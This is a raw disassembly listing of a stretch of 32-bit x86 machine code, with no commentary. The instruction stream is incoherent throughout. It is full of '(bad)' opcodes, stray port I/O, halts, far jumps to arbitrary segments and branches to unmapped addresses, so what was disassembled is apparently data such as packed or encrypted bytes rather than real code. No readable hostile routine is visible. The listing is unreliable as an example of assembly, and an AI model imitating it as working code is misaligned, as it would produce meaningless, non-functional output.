  41b4d9:	mov    ds:0x7f798a02,eax
  41b4de:	mov    ebp,DWORD PTR [esi+0x38]
  41b4e1:	fisttp QWORD PTR [esi-0x31f3575b]
  41b4e7:	sar    BYTE PTR [ebx],0x41
  41b4ea:	sub    BYTE PTR [ecx-0x3a],bl
  41b4ed:	mov    BYTE PTR [esi-0x138a6c7c],ch
  41b4f3:	retf   
  41b4f4:	xor    eax,DWORD PTR [ecx+edx*1+0x36e91054]
  41b4fb:	das    
  41b4fc:	dec    ebp
  41b4fd:	and    al,0x70
  41b4ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b500:	push   ds
  41b501:	dec    edx
  41b502:	icebp  
  41b503:	imul   ebp,esi,0x6
  41b506:	jmp    0x38cb214e
  41b50b:	sbb    eax,0x4b71ce15
  41b510:	and    eax,0xc92e39be
  41b515:	jo     0x41b4f4
  41b517:	lods   ax,WORD PTR ds:[esi]
  41b519:	push   edx
  41b51a:	jl     0x41b58f
  41b51c:	add    dh,dh
  41b51e:	xor    bh,BYTE PTR [ebx]
  41b520:	lahf   
  41b521:	(bad)  
  41b522:	sbb    DWORD PTR [edx],esp
  41b524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b525:	mov    dh,0xf8
  41b527:	cld    
  41b528:	or     eax,0xa2a24c8b
  41b52d:	mov    edx,0x5e4abac5
  41b532:	dec    esi
  41b533:	lea    edx,[esp+esi*1+0x8d20650]
  41b53a:	out    dx,eax
  41b53b:	test   al,0x38
  41b53d:	scas   eax,DWORD PTR es:[edi]
  41b53e:	xor    ch,BYTE PTR ds:0x32c2df65
	...
  41b550:	add    dh,ch
  41b552:	data16 hlt 
  41b554:	lods   eax,DWORD PTR ds:[esi]
  41b555:	cld    
  41b556:	mov    edi,0xbcb067ff
  41b55b:	hlt    
  41b55c:	xor    eax,0x8b3c1f76
  41b561:	xor    al,BYTE PTR [bx+di]
  41b564:	add    BYTE PTR [ebx+0x68000003],ch
  41b56a:	pushf  
  41b56b:	inc    ebp
  41b56c:	setp   BYTE PTR [ecx+ecx*8]
  41b570:	hlt    
  41b571:	cli    
  41b572:	lods   al,BYTE PTR ds:[esi]
  41b573:	or     ch,BYTE PTR [ebp+0x71]
  41b576:	or     BYTE PTR [eax-0x3d],0x2c
  41b57a:	inc    ecx
  41b57b:	mov    WORD PTR [edi-0x7e],?
  41b57e:	mov    al,0xdb
  41b580:	pop    ss
  41b581:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41b583:	fild   WORD PTR [ecx+ebp*1+0x64ed06c]
  41b58a:	jnp    0x41b5d4
  41b58c:	rol    DWORD PTR [ebx],cl
  41b58e:	sub    edi,esi
  41b590:	sahf   
  41b591:	inc    ebx
  41b592:	cmp    ah,BYTE PTR [ebx+0x3551b7f1]
  41b598:	cs xchg esp,eax
  41b59a:	add    eax,0xc48ae985
  41b59f:	fldcw  WORD PTR [edi+0x50dc3e54]
  41b5a5:	(bad)  
  41b5a6:	or     eax,DWORD PTR [edx-0x6c]
  41b5a9:	inc    eax
  41b5aa:	xchg   esi,eax
  41b5ab:	push   ss
  41b5ac:	jecxz  0x41b59e
  41b5ae:	popf   
  41b5af:	pusha  
  41b5b0:	test   DWORD PTR [esi+0x5a],ecx
  41b5b3:	xor    DWORD PTR [eax-0x6c16e64],0x1bcc23ff
  41b5bd:	out    0xf5,al
  41b5bf:	shr    BYTE PTR [edx],cl
  41b5c1:	jmp    0x97c5357f
  41b5c6:	out    0x20,al
  41b5c8:	jne    0x41b551
  41b5ca:	mov    al,BYTE PTR [edx-0x5180bec1]
  41b5d0:	mov    DWORD PTR ds:0xf05a3658,eax
  41b5d6:	not    BYTE PTR [esi]
  41b5d8:	lods   al,BYTE PTR ds:[esi]
  41b5d9:	sbb    DWORD PTR [edi],edx
  41b5db:	adc    dh,0x57
  41b5de:	ja     0x41b58a
  41b5e0:	in     eax,0x70
  41b5e2:	add    al,0x1b
  41b5e4:	adc    eax,0xa097a0d9
  41b5e9:	xor    ebx,DWORD PTR [eax]
  41b5eb:	dec    ebp
  41b5ec:	mov    ch,BYTE PTR [edi]
  41b5ee:	je     0x41b65e
  41b5f0:	xor    edx,DWORD PTR [ebx]
  41b5f2:	push   ebp
  41b5f3:	add    eax,0x423ddee6
  41b5f8:	or     cl,BYTE PTR [eax+0x64f5e3c3]
  41b5fe:	pop    ebp
  41b5ff:	jns    0x41b67b
  41b601:	popa   
  41b602:	and    dh,BYTE PTR [ebx+edi*8]
  41b605:	inc    edx
  41b606:	pop    esp
  41b607:	mov    al,ds:0x1f27764b
  41b60c:	mov    ds:0xdf14ce6d,eax
  41b611:	sbb    bl,BYTE PTR [ebx+0x5a]
  41b614:	stos   DWORD PTR es:[edi],eax
  41b615:	xchg   edi,eax
  41b616:	inc    ecx
  41b617:	enter  0xfbd9,0xbe
  41b61b:	pusha  
  41b61c:	sahf   
  41b61d:	mov    cl,0x80
  41b61f:	xor    al,0x7a
  41b621:	shl    BYTE PTR [edi-0x5cf5c3b9],cl
  41b627:	xor    bh,BYTE PTR [di]
  41b62a:	rcl    DWORD PTR [edx-0x2e],0xb3
  41b62e:	mov    al,0xf2
  41b630:	push   edx
  41b631:	out    0x4d,eax
  41b633:	push   0xffffffba
  41b635:	mov    dl,0x21
  41b637:	inc    ebx
  41b638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b639:	sbb    al,ah
  41b63b:	sub    BYTE PTR [eax],ah
  41b63d:	add    al,0xdd
  41b63f:	cld    
  41b640:	(bad)  
  41b641:	mov    ebp,0x46b26345
  41b646:	push   0x32a5a833
  41b64b:	sbb    BYTE PTR [ebx-0x61],dh
  41b64e:	ins    BYTE PTR es:[edi],dx
  41b64f:	add    BYTE PTR [ebx+0x34becb0e],bh
  41b655:	imul   BYTE PTR [esp+eiz*8+0x1d1cadb4]
  41b65c:	test   BYTE PTR [ebp+ecx*2+0x1a],al
  41b660:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41b662:	cdq    
  41b663:	cmp    al,0xb2
  41b665:	add    dl,BYTE PTR [edx+edx*4-0x68]
  41b669:	ds push ebx
  41b66b:	cli    
  41b66c:	and    ecx,DWORD PTR [ebx+0x796cca36]
  41b672:	cli    
  41b673:	dec    edi
  41b674:	in     al,dx
  41b675:	jp     0x41b6d9
  41b677:	dec    eax
  41b678:	jmp    0x25632718
  41b67d:	mov    bh,0xc6
  41b67f:	mov    ds:0x228bd2e3,eax
  41b684:	sbb    BYTE PTR [ebp+0x18eea191],al
  41b68a:	in     al,dx
  41b68b:	sub    al,0x66
  41b68d:	test   BYTE PTR [ecx],dh
  41b68f:	mov    al,ds:0xc05426b7
  41b694:	xor    DWORD PTR [eax-0x5b],esp
  41b697:	loop   0x41b643
  41b699:	jl     0x41b688
  41b69b:	adc    cl,ah
  41b69d:	adc    eax,0x32078549
  41b6a2:	xor    DWORD PTR [esi+edi*8+0x1e],edi
  41b6a6:	mov    eax,0x5cc7c00e
  41b6ab:	lea    edx,[eax+0x20]
  41b6ae:	adc    DWORD PTR [ebx+esi*8-0x663d64e9],0x93664e4e
  41b6b9:	cmc    
  41b6ba:	sbb    BYTE PTR [edi],al
  41b6bc:	or     ecx,DWORD PTR ds:0xc89c498f
  41b6c2:	xchg   DWORD PTR [esp+edi*2],edx
  41b6c5:	fwait
  41b6c6:	jmp    FWORD PTR [ecx+0x2893826b]
  41b6cc:	inc    esi
  41b6cd:	ins    BYTE PTR es:[edi],dx
  41b6ce:	repnz cs lahf 
  41b6d1:	cdq    
  41b6d2:	jp     0x41b666
  41b6d4:	into   
  41b6d5:	xchg   esi,eax
  41b6d6:	je     0x41b669
  41b6d8:	cmc    
  41b6d9:	jg     0x41b737
  41b6db:	loop   0x41b6b1
  41b6dd:	jg     0x41b668
  41b6df:	aad    0x5
  41b6e1:	aam    0x26
  41b6e3:	stc    
  41b6e4:	dec    edi
  41b6e5:	sbb    DWORD PTR [ecx],ebx
  41b6e7:	add    al,BYTE PTR [ecx]
  41b6e9:	lahf   
  41b6ea:	lahf   
  41b6eb:	(bad)  
  41b6ec:	(bad)
  41b6f1:	push   esp
  41b6f2:	inc    edi
  41b6f3:	test   ah,0xda
  41b6f6:	stos   DWORD PTR es:[edi],eax
  41b6f7:	push   0xf9161fa5
  41b6fc:	test   al,0xa7
  41b6fe:	int3   
  41b6ff:	mov    eax,ds:0x69a30b6
  41b704:	jge    0x41b6b1
  41b706:	rcl    BYTE PTR [ebx],1
  41b708:	ins    DWORD PTR es:[edi],dx
  41b709:	inc    eax
  41b70a:	mov    WORD PTR ds:0x86412f17,cs
  41b710:	and    al,0xdb
  41b712:	fwait
  41b713:	or     eax,0x46e4b8f7
  41b718:	xchg   DWORD PTR [eax+esi*2-0x2ce2f510],edx
  41b71f:	(bad)  
  41b720:	xor    ebx,DWORD PTR [esi-0x53]
  41b723:	rol    BYTE PTR [ebx+eax*8],cl
  41b726:	in     al,dx
  41b727:	cmp    eax,esp
  41b729:	pop    edx
  41b72a:	scas   al,BYTE PTR es:[edi]
  41b72b:	push   ecx
  41b72c:	inc    edx
  41b72d:	fs loop 0x41b6fa
  41b730:	mov    DWORD PTR [ecx+0x66],ebp
  41b733:	push   ebx
  41b734:	jno    0x41b6c6
  41b736:	sbb    cl,al
  41b738:	pop    ecx
  41b739:	out    dx,eax
  41b73a:	int3   
  41b73b:	xor    al,0x30
  41b73d:	arpl   WORD PTR [edi],sp
  41b73f:	sbb    esi,DWORD PTR [edi-0x16]
  41b742:	icebp  
  41b743:	sbb    BYTE PTR [edx-0x12],0x12
  41b747:	jo     0x41b783
  41b749:	(bad)  
  41b74a:	loope  0x41b717
  41b74c:	mov    ah,0xa
  41b74e:	dec    edx
  41b74f:	shl    DWORD PTR [eax+eax*4-0x728cf0bc],0xc5
  41b757:	fnstsw WORD PTR [ecx+0x63139137]
  41b75d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b75e:	ret    0xe602
  41b761:	add    eax,0x46cb8a13
  41b766:	mov    esp,0xf9056d4a
  41b76b:	xchg   ecx,eax
  41b76c:	jmp    0x41b725
  41b76e:	nop
  41b76f:	sub    BYTE PTR [esp+ebx*1+0x1a],cl
  41b773:	ja     0x41b773
  41b775:	push   ebx
  41b776:	mov    ecx,DWORD PTR [edx-0x78]
  41b779:	nop
  41b77a:	sbb    DWORD PTR [esi-0x33fa6a9a],eax
  41b780:	pop    edx
  41b781:	iret   
  41b782:	mov    cl,BYTE PTR [ecx+ecx*8+0x1b]
  41b786:	and    dl,dl
  41b788:	(bad)  
  41b789:	or     edx,DWORD PTR [edx+0x2f]
  41b78c:	mov    bl,0x8c
  41b78e:	push   edi
  41b78f:	(bad)
  41b793:	xchg   edi,eax
  41b794:	push   esp
  41b795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b796:	lea    ecx,[edi]
  41b798:	call   0xffba2972
  41b79d:	mov    ah,0x7c
  41b79f:	sbb    BYTE PTR [edx*1+0x6452e1ea],bh
  41b7a6:	(bad)  
  41b7a7:	sbb    al,0x41
  41b7a9:	int3   
  41b7aa:	jmp    0xf4cc:0x6b7baa66
  41b7b1:	adc    BYTE PTR [eax-0x7f],bl
  41b7b4:	(bad)  [edi+esi*2]
  41b7b7:	fnstcw WORD PTR [eax+eiz*2]
  41b7ba:	and    BYTE PTR cs:[eax-0x4d016d46],ah
  41b7c1:	xor    eax,0xba4c1940
  41b7c6:	dec    ebx
  41b7c7:	jecxz  0x41b792
  41b7c9:	les    esi,FWORD PTR ds:0x41a51467
  41b7cf:	cmp    ah,BYTE PTR [eax]
  41b7d1:	pop    eax
  41b7d2:	jle    0x41b79e
  41b7d4:	jle    0x41b771
  41b7d6:	adc    DWORD PTR ds:0xfd728586,esi
  41b7dc:	ss repnz push ebp
  41b7df:	loopne 0x41b76f
  41b7e1:	icebp  
  41b7e2:	test   eax,0xa97d4db2
  41b7e7:	inc    edi
  41b7e8:	lea    edi,[edx+0x3f3fc1d6]
  41b7ee:	xor    dh,BYTE PTR [ebx+0x54]
  41b7f1:	pop    ebx
  41b7f2:	repz popf 
  41b7f4:	pop    edx
  41b7f5:	test   eax,0x2ed0b23d
  41b7fa:	jp     0x41b82f
  41b7fc:	cmp    ecx,esp
  41b7fe:	jl     0x41b7b9
  41b800:	(bad)  
  41b802:	outs   dx,BYTE PTR ds:[esi]
  41b803:	sbb    al,0x22
  41b805:	pop    ecx
  41b806:	xor    ecx,DWORD PTR [edx-0x3d86b0ee]
  41b80c:	xchg   ebx,eax
  41b80d:	mov    es,WORD PTR [edi-0x41]
  41b810:	adc    esi,eax
  41b812:	(bad)  [eax+0x2a]
  41b815:	and    BYTE PTR [eax],al
  41b817:	aad    0x98
  41b819:	xor    al,0xcf
  41b81b:	jle    0x41b89c
  41b81d:	rcr    DWORD PTR [ebx],1
  41b81f:	cs call 0x5962:0x4fc8c618
  41b827:	mov    al,ds:0x51f9da3
  41b82c:	inc    edi
  41b82d:	leave  
  41b82e:	inc    esi
  41b82f:	(bad)  
  41b830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b831:	pusha  
  41b832:	xchg   esp,eax
  41b833:	cmp    BYTE PTR [ecx+0x4d],bh
  41b836:	xor    bh,0xc7
  41b839:	xchg   DWORD PTR [ecx+0x35454913],ebx
  41b83f:	dec    ebp
  41b840:	mov    WORD PTR [edx+0x70],gs
  41b843:	inc    edi
  41b844:	fadd   st(7),st
  41b846:	arpl   dx,sp
  41b848:	mov    ?,WORD PTR [edx+0x23]
  41b84b:	test   BYTE PTR [ebx+eax*2-0x58],0xf6
  41b850:	fcomip st,st(6)
  41b852:	jg     0x41b80a
  41b854:	hlt    
  41b855:	imul   BYTE PTR [ebx]
  41b857:	sbb    DWORD PTR [ebp+0x4e],eax
  41b85a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b85b:	(bad)  
  41b85c:	sbb    eax,0x9d9e08d7
  41b861:	push   cs
  41b862:	sub    DWORD PTR [eax],esp
  41b864:	xor    eax,0xcc136d34
  41b869:	sbb    BYTE PTR [ebx],bh
  41b86b:	icebp  
  41b86c:	out    dx,al
  41b86d:	push   es
  41b86e:	adc    esi,DWORD PTR [eax]
  41b870:	or     ebx,ebp
  41b872:	daa    
  41b873:	mov    al,ds:0x88d4e2f2
  41b878:	push   es
  41b879:	imul   ebx,DWORD PTR [eax+0x61],0xdd3e0c01
  41b880:	push   eax
  41b881:	jge    0x41b8e9
  41b883:	inc    ebx
  41b884:	repz lock lahf 
  41b887:	cmp    al,0xaf
  41b889:	scas   al,BYTE PTR es:[edi]
  41b88a:	rcl    DWORD PTR [edx-0x36],0xa3
  41b88e:	or     BYTE PTR [ebp-0x4207c9a5],ah
  41b894:	adc    ebp,ecx
  41b896:	fcmovu st,st(6)
  41b898:	jp     0x41b882
  41b89a:	(bad)  
  41b89b:	pop    esi
  41b89c:	add    esi,ebx
  41b89e:	and    ch,bl
  41b8a0:	icebp  
  41b8a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a2:	popf   
  41b8a3:	inc    edi
  41b8a4:	jb     0x41b87e
  41b8a6:	adc    al,0xbd
  41b8a8:	pop    ecx
  41b8a9:	push   ebx
  41b8aa:	sub    al,0xe1
  41b8ac:	pusha  
  41b8ad:	pop    edx
  41b8ae:	jns    0x41b916
  41b8b0:	inc    eax
  41b8b1:	mov    WORD PTR [eax-0x20],ss
  41b8b4:	jo     0x41b847
  41b8b6:	jnp    0x41b8f3
  41b8b8:	jb     0x41b904
  41b8ba:	cmc    
  41b8bb:	ret    
  41b8bc:	fs call 0x68674e63
  41b8c2:	lea    esi,[bp+di-0x5ee2]
  41b8c7:	in     eax,0x7f
  41b8c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8ca:	or     al,BYTE PTR ds:0x6d12dd64
  41b8d0:	adc    ebx,ebx
  41b8d2:	in     eax,dx
  41b8d3:	les    ecx,FWORD PTR [ecx-0x33]
  41b8d6:	xchg   edx,esi
  41b8d8:	mov    eax,0x267378d8
  41b8dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8de:	push   0xffffff8b
  41b8e0:	dec    eax
  41b8e1:	ja     0x41b8a4
  41b8e3:	sbb    DWORD PTR [eax],edi
  41b8e5:	jl     0x41b899
  41b8e7:	in     eax,0xf9
  41b8e9:	mov    DWORD PTR [ecx-0x15],edi
  41b8ec:	cmc    
  41b8ed:	and    eax,0xe0bbd44
  41b8f2:	and    edi,DWORD PTR [edi+0x3d438a64]
  41b8f8:	rol    ah,cl
  41b8fa:	push   0x70
  41b8fc:	clc    
  41b8fd:	jnp    0x41b96f
  41b8ff:	inc    edx
  41b900:	retf   
  41b901:	jl     0x41b8d5
  41b903:	icebp  
  41b904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b905:	dec    edx
  41b906:	sbb    ebp,DWORD PTR [edi+0x9]
  41b909:	imul   edi,DWORD PTR [eax+0x3428afdc],0x3558bec
  41b913:	xor    DWORD PTR [eax],eax
	...
  41b921:	adc    eax,0x7fd60e68
  41b926:	neg    ch
  41b928:	jmp    0x41b991
  41b92a:	cli    
  41b92b:	and    BYTE PTR [esi-0x53],ah
  41b92e:	xor    eax,0x361272ba
  41b933:	add    DWORD PTR [eax],eax
  41b935:	stos   DWORD PTR es:[edi],eax
  41b936:	add    eax,DWORD PTR [eax]
  41b938:	add    cl,bh
  41b93a:	mov    DWORD PTR [ebp-0x9],edi
  41b93d:	into   
  41b93e:	lods   eax,DWORD PTR ds:[esi]
  41b93f:	daa    
  41b940:	xlat   BYTE PTR ds:[ebx]
  41b941:	mov    edx,0x20c6aecf
  41b946:	rcl    BYTE PTR [ebp-0x1d],0xf8
  41b94a:	adc    ah,BYTE PTR [esi-0x25]
  41b94d:	push   ecx
  41b94e:	adc    al,0xdb
  41b950:	mov    WORD PTR [edx-0x1a],?
  41b953:	lods   eax,DWORD PTR ds:[esi]
  41b954:	lods   al,BYTE PTR ds:[esi]
  41b955:	fldenv [ebx]
  41b957:	jae    0x41b9c5
  41b959:	xchg   esp,eax
  41b95a:	lods   al,BYTE PTR ds:[esi]
  41b95b:	repnz pop eax
  41b95d:	les    eax,FWORD PTR [eax-0x4e]
  41b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b961:	inc    ebx
  41b962:	push   ds
  41b963:	adc    esi,ebp
  41b965:	jb     0x41b96f
  41b967:	scas   al,BYTE PTR es:[edi]
  41b968:	dec    esp
  41b969:	retf   
  41b96a:	les    ecx,FWORD PTR [edi]
  41b96c:	fld    QWORD PTR [edx]
  41b96e:	pushf  
  41b96f:	mov    ds:0x129dc5e9,eax
  41b974:	jp     0x41b99e
  41b976:	das    
  41b977:	minps  xmm3,xmm7
  41b97a:	sti    
  41b97b:	shl    bl,0x7
  41b97e:	inc    eax
  41b97f:	mov    dl,BYTE PTR [esi-0x2018e608]
  41b985:	dec    ebp
  41b986:	and    ch,bl
  41b988:	popa   
  41b989:	out    0x4,eax
  41b98b:	pop    es
  41b98c:	or     ch,BYTE PTR [esp+eax*8-0x66]
  41b990:	xor    ch,BYTE PTR [ecx+0x4cd492eb]
  41b996:	sbb    DWORD PTR [edx+0x26],eax
  41b999:	es das 
  41b99b:	dec    esp
  41b99c:	sahf   
  41b99d:	push   ecx
  41b99e:	sar    ebp,0x91
  41b9a1:	mov    eax,ds:0xa00ffa6f
  41b9a6:	stc    
  41b9a7:	push   ebx
  41b9a8:	cmp    ebp,ebx
  41b9aa:	pop    esi
  41b9ab:	imul   DWORD PTR [edx+0x71]
  41b9ae:	and    cl,bh
  41b9b0:	mov    dh,0x8f
  41b9b2:	fs stos DWORD PTR es:[edi],eax
  41b9b4:	push   ebp
  41b9b5:	mov    bl,0xdd
  41b9b7:	scas   eax,DWORD PTR es:[edi]
  41b9b8:	ja     0x41b9c9
  41b9ba:	mov    bl,0xa3
  41b9bc:	mov    DWORD PTR [eax+0x1d],edx
  41b9bf:	outs   dx,DWORD PTR ds:[esi]
  41b9c0:	test   al,0x50
  41b9c2:	xchg   ecx,eax
  41b9c3:	icebp  
  41b9c4:	mov    ch,0x54
  41b9c6:	mov    cl,0xa9
  41b9c8:	mov    ds:0xde67ece4,al
  41b9cd:	lods   eax,DWORD PTR ds:[esi]
  41b9ce:	cwde   
  41b9cf:	aaa    
  41b9d0:	xor    al,0x84
  41b9d2:	hlt    
  41b9d3:	rcr    DWORD PTR [ecx-0x1cc71b3],1
  41b9d9:	pop    eax
  41b9da:	xor    DWORD PTR [eax+0x76],esi
  41b9dd:	cmp    BYTE PTR [edi],al
  41b9df:	mov    bh,0x38
  41b9e1:	adc    BYTE PTR [edx],0xb1
  41b9e4:	dec    ebx
  41b9e5:	sahf   
  41b9e6:	inc    edx
  41b9e7:	mov    bh,0xc7
  41b9e9:	push   ebp
  41b9ea:	clc    
  41b9eb:	cmp    ebp,ebp
  41b9ed:	(bad)  
  41b9ee:	jge    0x41ba57
  41b9f0:	inc    ecx
  41b9f1:	iretw  
  41b9f3:	out    0x26,eax
  41b9f5:	int    0xa5
  41b9f7:	aas    
  41b9f8:	repnz aad 0x1b
  41b9fb:	hlt    
  41b9fc:	jmp    0xdbd46859
  41ba01:	and    edi,esp
  41ba03:	mov    dh,0x72
  41ba05:	sbb    al,0x94
  41ba07:	call   0x1205924e
  41ba0c:	push   esi
  41ba0d:	add    eax,DWORD PTR [eax-0x1c]
  41ba10:	adc    DWORD PTR [esp+ebx*2+0xf0ad5ed],esp
  41ba17:	add    ebp,DWORD PTR [di-0x78]
  41ba1b:	(bad)  
  41ba1c:	push   ecx
  41ba1d:	jns    0x41ba4e
  41ba1f:	repnz outs dx,BYTE PTR ds:[esi]
  41ba21:	xor    bl,BYTE PTR [eax+0x42fda9c2]
  41ba27:	and    DWORD PTR [ecx-0x50e4c9fa],edi
  41ba2d:	inc    esi
  41ba2e:	mov    cl,BYTE PTR [esi-0x52]
  41ba31:	jo     0x41b9cd
  41ba33:	jecxz  0x41b9dd
  41ba35:	in     eax,0x9e
  41ba37:	xchg   esi,eax
  41ba38:	lods   al,BYTE PTR ds:[esi]
  41ba39:	add    dl,al
  41ba3b:	sub    ah,ah
  41ba3d:	inc    edx
  41ba3e:	pop    esp
  41ba3f:	loop   0x41ba23
  41ba41:	add    BYTE PTR [ebx+0x2d48050a],cl
  41ba47:	mov    dl,0xfa
  41ba49:	in     al,0x46
  41ba4b:	push   eax
  41ba4c:	pop    ebx
  41ba4d:	jmp    0x33e0fff7
  41ba52:	sti    
  41ba53:	pop    edx
  41ba54:	test   eax,0xd3accc35
  41ba59:	repz aas 
  41ba5b:	call   0x8a7f7c37
  41ba60:	in     eax,0x24
  41ba62:	sub    al,0xbe
  41ba64:	es mov ebp,0x47ea0ff7
  41ba6a:	inc    eax
  41ba6b:	ret    
  41ba6c:	iret   
  41ba6d:	sub    dl,BYTE PTR [ecx-0xe]
  41ba70:	in     ax,0x19
  41ba73:	pop    ebp
  41ba74:	xor    DWORD PTR [edi-0x14],esp
  41ba77:	js     0x41bad0
  41ba79:	test   eax,0x54c9bde9
  41ba7e:	jg     0x41bad7
  41ba80:	adc    BYTE PTR [edx-0x66],bl
  41ba83:	inc    esp
  41ba84:	cmp    ah,bl
  41ba86:	test   DWORD PTR [ebp+0x644855b1],ebp
  41ba8c:	ret    0x177a
  41ba8f:	data16 jg 0x41ba33
  41ba92:	fcmovnbe st,st(6)
  41ba94:	push   ebp
  41ba95:	out    dx,al
  41ba96:	push   es
  41ba97:	retf   0x5f6c
  41ba9a:	mov    dh,0x59
  41ba9c:	xchg   ebp,eax
  41ba9d:	call   0x5e0d:0x31a42423
  41baa4:	pop    edx
  41baa5:	ins    DWORD PTR es:[edi],dx
  41baa6:	in     al,0x59
  41baa8:	pop    ebx
  41baa9:	sahf   
  41baaa:	adc    al,0x8d
  41baac:	xor    DWORD PTR [ecx+0x6],ecx
  41baaf:	inc    ebx
  41bab0:	sub    eax,edi
  41bab2:	jno    0x41baa9
  41bab4:	rol    BYTE PTR [esi+0x54],0x6b
  41bab8:	mov    esi,0x890dfa73
  41babd:	ja     0x41bab2
  41babf:	push   edi
  41bac0:	sti    
  41bac1:	jp     0x41ba4d
  41bac3:	pop    es
  41bac4:	das    
  41bac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bac6:	loopne 0x41ba6c
  41bac8:	lods   al,BYTE PTR ds:[esi]
  41bac9:	push   bp
  41bacb:	mov    ebp,DWORD PTR ds:[ebx]
  41bace:	pop    edx
  41bacf:	(bad)  
  41bad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bad1:	cwde   
  41bad2:	retf   0xe30a
  41bad5:	lock sahf 
  41bad7:	adc    dh,BYTE PTR [ecx]
  41bad9:	sub    DWORD PTR ds:0xf969d85b,edx
  41badf:	mov    bh,0xa6
  41bae1:	add    esi,DWORD PTR [ecx]
  41bae3:	bound  eax,QWORD PTR [edi+0x58]
  41bae6:	mov    eax,0x339ce17d
  41baeb:	popa   
  41baec:	add    eax,0xe75707f5
  41baf1:	inc    esp
  41baf2:	push   ebx
  41baf3:	icebp  
  41baf4:	add    DWORD PTR [edx-0x3efb1f15],esp
  41bafa:	lods   al,BYTE PTR ds:[esi]
  41bafb:	rol    bh,cl
  41bafd:	div    DWORD PTR [edi]
  41baff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb00:	retf   
  41bb01:	dec    esi
  41bb02:	cdq    
  41bb03:	adc    al,0xfa
  41bb05:	pop    esp
  41bb06:	outs   dx,DWORD PTR ds:[esi]
  41bb07:	and    eax,0x24dee39c
  41bb0c:	ja     0x41bb04
  41bb0e:	lock mov ah,0x9b
  41bb11:	clc    
  41bb12:	mov    al,0x12
  41bb14:	dec    edx
  41bb15:	adc    BYTE PTR [eax],bh
  41bb17:	ja     0x41bb65
  41bb19:	out    dx,al
  41bb1a:	adc    dh,ah
  41bb1c:	jp     0x41bb1d
  41bb1e:	add    al,0xdf
  41bb20:	and    al,0x0
  41bb22:	lods   eax,DWORD PTR ds:[esi]
  41bb23:	repnz push edi
  41bb25:	inc    edx
  41bb26:	out    0x5b,al
  41bb28:	fidiv  DWORD PTR [ebx+0x1805111d]
  41bb2e:	add    eax,ebx
  41bb30:	dec    esi
  41bb31:	mov    ebp,0x6cdc9e7
  41bb36:	rol    DWORD PTR [edi-0x33],0x94
  41bb3a:	mov    eax,ds:0xa1807f41
  41bb3f:	(bad)  
  41bb40:	lock adc ecx,DWORD PTR fs:[edi]
  41bb44:	(bad)
  41bb48:	push   ecx
  41bb49:	dec    ecx
  41bb4a:	mov    ds:0x2e04e390,eax
  41bb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb50:	pop    eax
  41bb51:	mov    ds:0xe52ad1e5,al
  41bb56:	call   0xf87ec60f
  41bb5b:	mov    al,0x74
  41bb5d:	jmp    0xee14c915
  41bb62:	jbe    0x41bb0d
  41bb64:	inc    ebx
  41bb65:	(bad)  
  41bb66:	lods   eax,DWORD PTR ds:[esi]
  41bb67:	push   es
  41bb68:	mov    esi,0x55f83414
  41bb6d:	mov    ds,ecx
  41bb6f:	mov    eax,ds:0xa018963f
  41bb74:	sbb    dh,dl
  41bb76:	shl    DWORD PTR [edx+0x52],0x15
  41bb7a:	fidiv  DWORD PTR [edi]
  41bb7c:	add    eax,0x7fe08cae
  41bb81:	pop    eax
  41bb82:	sbb    ebp,ebx
  41bb84:	(bad)  
  41bb85:	popa   
  41bb86:	scas   al,BYTE PTR es:[edi]
  41bb87:	popf   
  41bb88:	ins    DWORD PTR es:[edi],dx
  41bb89:	or     edx,DWORD PTR [ebx-0x14171f69]
  41bb8f:	nop
  41bb90:	pop    edx
  41bb91:	dec    ebp
  41bb92:	inc    eax
  41bb93:	aad    0xdd
  41bb95:	call   0x86af:0x189e46ea
  41bb9c:	clc    
  41bb9d:	xlat   BYTE PTR ds:[ebx]
  41bb9e:	pop    edx
  41bb9f:	aam    0x8d
  41bba1:	pop    es
  41bba2:	or     eax,esi
  41bba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bba5:	push   esp
  41bba6:	neg    esp
  41bba8:	add    BYTE PTR [edi-0x697da695],al
  41bbae:	lock mov WORD PTR [edx+edx*8],es
  41bbb2:	mov    ebx,0x3c1324f6
  41bbb7:	mov    WORD PTR [esi+0x3f],gs
  41bbba:	xor    BYTE PTR [edi+0x20],ah
  41bbbd:	(bad)  
  41bbbe:	cmc    
  41bbbf:	pushf  
  41bbc0:	pop    ebx
  41bbc1:	jnp    0x41bb7e
  41bbc3:	ficom  DWORD PTR [ecx-0x2406b137]
  41bbc9:	adc    DWORD PTR [ecx+0x43d8b9af],0x4ebd43d9
  41bbd3:	(bad)  
  41bbd4:	mov    ebx,0x7758e171
  41bbd9:	ficomp WORD PTR [esi]
  41bbdb:	into   
  41bbdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbdd:	imul   ebx,DWORD PTR [ebp-0x37],0x3
  41bbe1:	nop
  41bbe2:	jmp    0x41bc23
  41bbe4:	mov    DWORD PTR [edx+0x7541a6],eax
  41bbea:	cmp    eax,0x4cf8a4c1
  41bbef:	sub    DWORD PTR [ecx+0x78d05d69],edx
  41bbf5:	les    esp,FWORD PTR [ecx-0x44]
  41bbf8:	aaa    
  41bbf9:	xor    BYTE PTR [edi+0xe],ch
  41bbfc:	cmp    BYTE PTR [ebx+edx*1],al
  41bbff:	mov    eax,DWORD PTR [ebp-0x31595fd3]
  41bc05:	retf   0x8953
  41bc08:	out    dx,eax
